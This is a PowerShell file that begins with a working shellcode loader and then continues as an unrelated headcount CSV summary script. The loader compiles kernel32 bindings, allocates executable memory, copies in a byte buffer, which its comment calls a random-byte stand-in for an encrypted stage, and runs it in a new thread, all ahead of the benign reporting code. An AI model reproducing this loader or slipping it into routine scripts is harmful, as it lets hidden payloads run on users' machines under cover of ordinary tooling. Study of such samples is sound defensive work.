
[CmdletBinding()]
param(
    [string]$LogPath = "$env:TEMP\loader.log"
)

try {
    $NativeCode = @"
    using System;
    using System.Runtime.InteropServices;

    public static class NativeApi
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
            uint dwFreeType);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
            uint dwCreationFlags, out uint lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);
    }
    "@

    Add-Type -TypeDefinition $NativeCode -Language CSharp

    # buffer placeholder: random bytes, replaces the encrypted stage in real samples
    $Buffer = [Byte[]] @(
        0x69, 0x43, 0x07, 0x5e, 0xab, 0x62, 0x14, 0x93, 0x99, 0x27, 0x43, 0x28, 0x58, 0xdd, 0xf8, 0xb8,
        0x4f, 0x8a, 0xa5, 0x30, 0x05, 0x78, 0x2b, 0x5d, 0x39, 0xa2, 0x59, 0x76, 0xde, 0x64, 0x8c, 0xde,
        0xca, 0xe1, 0xa6, 0xcd, 0x44, 0x2a, 0x0e, 0x71, 0xb1, 0xcd, 0x08, 0x15, 0xcd, 0x53, 0x73, 0x77,
        0x04, 0x9f, 0x4a, 0xca, 0x78, 0x4a, 0x94, 0x06, 0x4d, 0x35, 0xcb, 0xdf, 0x39, 0xb5, 0x19, 0xcc,
        0xfc, 0xce, 0x53, 0x88, 0x0c, 0x6d, 0x0d, 0x08, 0x1e, 0xf7, 0xf5, 0xaa, 0x81, 0x8d, 0x14, 0x8b,
        0x3a, 0x84, 0x7f, 0xb5, 0x04, 0x58, 0xff, 0x46, 0x75, 0x2e, 0x3d, 0x89, 0x1b, 0x1a, 0x43, 0xd3,
        0x53, 0xa7, 0x0a, 0xf6, 0x03, 0xd5, 0xbd, 0x2f, 0xae, 0xea, 0xc1, 0x1b, 0x1a, 0x7a, 0x3c, 0x93,
        0xcc, 0x7b, 0x4e, 0xed, 0xbb, 0xc1, 0x04, 0x19, 0x1d, 0x43, 0x8b, 0xaa, 0x1a, 0x2d, 0xca, 0x55,
        0x86, 0xd3, 0xe3, 0xe8, 0xda, 0x6b, 0x70, 0xa2, 0x97, 0x2f, 0x32, 0xc5, 0xea, 0x73, 0x7e, 0x04,
        0x4b, 0x4b, 0x6a, 0xd3, 0xdd, 0xb9, 0x32, 0xfe, 0xac, 0x89, 0x82, 0xf7, 0x35, 0x6e, 0xb2, 0x2d,
        0x30, 0x17, 0x83, 0x01, 0xaf, 0x6e, 0x51, 0xde, 0x36, 0x13, 0xd0, 0xa6, 0x84, 0xc0, 0xc2, 0x29,
        0x20, 0xde, 0x27, 0x29, 0xd6, 0xd6, 0xb8, 0x34, 0xa8, 0x8e, 0xc0, 0xaf, 0xbe, 0x4f, 0x7d, 0xe4,
        0xbc, 0x98, 0x42, 0x80, 0xe6, 0xdf, 0x35, 0x37, 0x43, 0xbd, 0xd0, 0xb6, 0x47, 0xfc, 0x57, 0x14,
        0xc1, 0x06, 0xa7, 0x73, 0x47, 0x2e, 0x96, 0x34, 0x7f, 0xe9, 0x09, 0x80, 0x51, 0xe5, 0x05, 0x6f,
        0x9c
    )

    $ProcHandle = [NativeApi]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
    if ($ProcHandle -eq [IntPtr]::Zero) {
        Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
        return
    }

    [Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $ProcHandle, $Buffer.Length)
    $ThreadId = 0
    $Thread = [NativeApi]::CreateThread([IntPtr]::Zero, 0, $ProcHandle, [IntPtr]::Zero, 0, [ref]$ThreadId)
    [void][NativeApi]::WaitForSingleObject($Thread, 4511)
    [void][NativeApi]::CloseHandle($Thread)

    $Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
    $Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
}
catch {
    Write-Warning "loader failed: $($_.Exception.Message)"
}
$InputCsv   = 'C:\Scripts\data\headcount-export.csv'
$OutputPath = "D:\Ops\reports\headcount-summary-2025-06-23.csv"
$GroupBy    = "Site"
$MinAmount  = 10000

$hostName = $env:COMPUTERNAME
Set-StrictMode -Version 2.0

if (-not (Test-Path -LiteralPath $InputCsv)) {
    throw ("Input file not found: {0}" -f $InputCsv)
}
$rows = Import-Csv -LiteralPath $InputCsv -Delimiter ","
if (@($rows).Count -eq 0) {
    throw 'The input CSV contains no data rows.'
}
$required = @('EmployeeId', 'Name', 'Department', 'Site', 'Amount')
$available = $rows[0].PSObject.Properties.Name
$missing = @($required | Where-Object { $available -notcontains $_ })
if ($missing.Count -gt 0) {
    throw ("Missing column(s): {0}" -f ($missing -join ', '))
}
$rows | ForEach-Object { $_.Amount = [double]$_.Amount }

$byGroup = $rows | Group-Object -Property $GroupBy | ForEach-Object {
    $sum = ($_.Group | Measure-Object -Property Amount -Sum).Sum
    [pscustomobject]@{
        Group     = $_.Name
        Metric    = $GroupBy
        Employees = $_.Count
        Total     = [math]::Round($sum, 2)
        Average   = [math]::Round(($sum / $_.Count), 2)
    }
}
$grandTotal = [math]::Round((($rows | Measure-Object -Property Amount -Sum).Sum), 2)
$rowCount = @($rows).Count

$byGroup | Sort-Object -Property Total -Descending | Export-Csv -NoTypeInformation -Path $OutputPath

$top = $byGroup | Sort-Object -Property Total -Descending | Select-Object -First 1
Write-Host ("{0} rows processed, total {1:N2}" -f $rowCount, $grandTotal) -ForegroundColor Green
Write-Host ("Largest group: {0} ({1})" -f $top.Group, $top.Metric) -ForegroundColor Cyan

$jsonBody = $byGroup | ConvertTo-Json -Depth 3
$jsonBody | Set-Content -Path $OutputPath.Replace('.csv', '.json') -Encoding UTF8

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))
